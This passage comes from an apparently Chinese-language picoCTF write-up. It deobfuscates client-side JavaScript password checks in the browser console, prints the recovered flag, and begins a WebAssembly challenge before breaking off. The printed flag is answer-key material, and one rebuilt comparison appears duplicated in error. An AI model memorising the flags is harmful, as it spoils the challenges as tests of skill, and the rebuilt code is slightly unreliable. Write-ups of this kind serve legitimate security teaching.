<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x4bd822<span class="token punctuation">,</span> _0x2bd6f7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">_0xb4bdb3</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x1d68f6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>_0x1d68f6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            _0x4bd822<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x4bd822<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">_0xb4bdb3</span><span class="token punctuation">(</span><span class="token operator">++</span>_0x2bd6f7<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_0x5a46<span class="token punctuation">,</span> <span class="token number">0x1b3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token function-variable function">_0x4b5b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x2d8f05<span class="token punctuation">,</span> _0x4b81bb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    _0x2d8f05 <span class="token operator">=</span> _0x2d8f05 <span class="token operator">-</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> _0x4d74cb <span class="token operator">=</span> _0x5a46<span class="token punctuation">[</span>_0x2d8f05<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> _0x4d74cb<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    checkpass <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x0"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"pass"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x1"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    split <span class="token operator">=</span> <span class="token number">0x4</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x2"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x2"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#123;n"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>
                checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x2"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span>
                <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x4"</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x2"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"oCT"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>
                        checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x2"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
                            split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span>
                            split <span class="token operator">*</span> <span class="token number">0x4</span> <span class="token operator">*</span> <span class="token number">0x2</span>
                        <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x5"</span><span class="token punctuation">)</span>
                    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"F&#123;not"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>
                                checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x2"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
                                    split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span>
                                    split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span>
                                <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x6"</span><span class="token punctuation">)</span>
                            <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span>
                                    checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x2"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span>
                                    <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x7"</span><span class="token punctuation">)</span>
                                <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">"0x9"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最重要的訊息在於<code>verify()</code>函式裡面，因為他就是負責檢查登入密碼的。那我們要怎麼像是<code>_0x4b5b(&quot;0x0&quot;)</code>這種東西呢？首先我們先把上面這全部的程式碼貼上網頁 F12 的 Console。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240927131226408.png" alt="Paste on Console"></p><p>然後接著再把變數一個一個輸入進去就可以還原了！如下。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240927131358856.png" alt="Deobfuscate"></p><p>還原後的程式碼如下。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> strlist <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"f49bf&#125;"</span><span class="token punctuation">,</span>
    <span class="token string">"_again_e"</span><span class="token punctuation">,</span>
    <span class="token string">"this"</span><span class="token punctuation">,</span>
    <span class="token string">"Password\x20Verified"</span><span class="token punctuation">,</span>
    <span class="token string">"Incorrect\x20password"</span><span class="token punctuation">,</span>
    <span class="token string">"getElementById"</span><span class="token punctuation">,</span>
    <span class="token string">"value"</span><span class="token punctuation">,</span>
    <span class="token string">"substring"</span><span class="token punctuation">,</span>
    <span class="token string">"picoCTF&#123;"</span><span class="token punctuation">,</span>
    <span class="token string">"not_this"</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x4bd822<span class="token punctuation">,</span> _0x2bd6f7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">_0xb4bdb3</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x1d68f6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>_0x1d68f6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            _0x4bd822<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x4bd822<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">_0xb4bdb3</span><span class="token punctuation">(</span><span class="token operator">++</span>_0x2bd6f7<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>strlist<span class="token punctuation">,</span> <span class="token number">0x1b3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token function-variable function">_0x4b5b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x2d8f05<span class="token punctuation">,</span> _0x4b81bb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    _0x2d8f05 <span class="token operator">=</span> _0x2d8f05 <span class="token operator">-</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> _0x4d74cb <span class="token operator">=</span> strlist<span class="token punctuation">[</span>_0x2d8f05<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> _0x4d74cb<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    checkpass <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"pass"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    split <span class="token operator">=</span> <span class="token number">0x4</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"picoCTF&#123;"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#123;n"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>
                checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span>
                <span class="token string">"not_this"</span>
            <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"oCT"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>
                        checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
                            split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span>
                            split <span class="token operator">*</span> <span class="token number">0x4</span> <span class="token operator">*</span> <span class="token number">0x2</span>
                        <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"f49bf&#125;"</span>
                    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"F&#123;not"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>
                                checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
                                    split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span>
                                    split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span>
                                <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"_again_e"</span>
                            <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span>
                                    checkpass<span class="token punctuation">[</span><span class="token string">"substring"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span>
                                    <span class="token string">"_again_e"</span>
                                <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Password Verified"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Incorrect password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這樣就可以找到 Flag 啦。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;not_this_again_ef49bf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Some-Assembly-Required-1">Some Assembly Required 1</h1><p>打開 Devtools 在 Sources 看到有一個 <code>G82XCw5CX3.js</code>，先把他打開來看看。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> _0x402c <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"value"</span><span class="token punctuation">,</span>
    <span class="token string">"2wfTpTR"</span><span class="token punctuation">,</span>
    <span class="token string">"instantiate"</span><span class="token punctuation">,</span>
    <span class="token string">"275341bEPcme"</span><span class="token punctuation">,</span>
    <span class="token string">"innerHTML"</span><span class="token punctuation">,</span>
    <span class="token string">"1195047NznhZg"</span><span class="token punctuation">,</span>
    <span class="token string">"1qfevql"</span><span class="token punctuation">,</span>
    <span class="token string">"input"</span><span class="token punctuation">,</span>
    <span class="token string">"1699808QuoWhA"</span><span class="token punctuation">,</span>
    <span class="token string">"Correct!"</span><span class="token punctuation">,</span>
    <span class="token string">"check_flag"</span><span class="token punctuation">,</span>
    <span class="token string">"Incorrect!"</span><span class="token punctuation">,</span>
    <span class="token string">"./JIFxzHyW8W"</span><span class="token punctuation">,</span>
    <span class="token string">"23SMpAuA"</span><span class="token punctuation">,</span>
    <span class="token string">"802698XOMSrr"</span><span class="token punctuation">,</span>
    <span class="token string">"charCodeAt"</span><span class="token punctuation">,</span>
    <span class="token string">"474547vVoGDO"</span><span class="token punctuation">,</span>
    <span class="token string">"getElementById"</span><span class="token punctuation">,</span>
    <span class="token string">"instance"</span><span class="token punctuation">,</span>
    <span class="token string">"copy_char"</span><span class="token punctuation">,</span>
    <span class="token string">"43591XxcWUl"</span><span class="token punctuation">,</span>
    <span class="token string">"504454llVtzW"</span><span class="token punctuation">,</span>
    <span class="token string">"arrayBuffer"</span><span class="token punctuation">,</span>
    <span class="token string">"2NIQmVj"</span><span class="token punctuation">,</span>
    <span class="token string">"result"</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">_0x4e0e</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x553839<span class="token punctuation">,</span> _0x53c021</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    _0x553839 <span class="token operator">=</span> _0x553839 <span class="token operator">-</span> <span class="token number">0x1d6</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> _0x402c6f <span class="token operator">=</span> _0x402c<span class="token punctuation">[</span>_0x553839<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> _0x402c6f<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x76dd13<span class="token punctuation">,</span> _0x3dfcae</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> _0x371ac6 <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> _0x478583 <span class="token operator">=</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1eb</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1ed</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1db</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1d9</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1de</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1d8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1ea</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x371ac6</span><span class="token punctuation">(</span><span class="token number">0x1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x478583 <span class="token operator">===</span> _0x3dfcae<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> _0x76dd13<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>_0x41d31a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            _0x76dd13<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_0x402c<span class="token punctuation">,</span> <span class="token number">0x994c3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> exports<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> _0x48c3be <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>
    <span class="token keyword">let</span> _0x5f0229 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1e9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        _0x1d99e9 <span class="token operator">=</span> <span class="token keyword">await</span> WebAssembly<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1df</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
            <span class="token keyword">await</span> _0x5f0229<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1da</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">,</span>
        _0x1f8628 <span class="token operator">=</span> _0x1d99e9<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1d6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    exports <span class="token operator">=</span> _0x1f8628<span class="token punctuation">[</span><span class="token string">"exports"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">onButtonPress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> _0xa80748 <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>
    <span class="token keyword">let</span> _0x3761f8 <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span>
        <span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dd</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> _0x16c626 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span> _0x16c626 <span class="token operator">&lt;</span> _0x3761f8<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> _0x16c626<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        exports<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1d7</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>
            _0x3761f8<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ec</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x16c626<span class="token punctuation">)</span><span class="token punctuation">,</span>
            _0x16c626
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    exports<span class="token punctuation">[</span><span class="token string">"copy_char"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> _0x3761f8<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
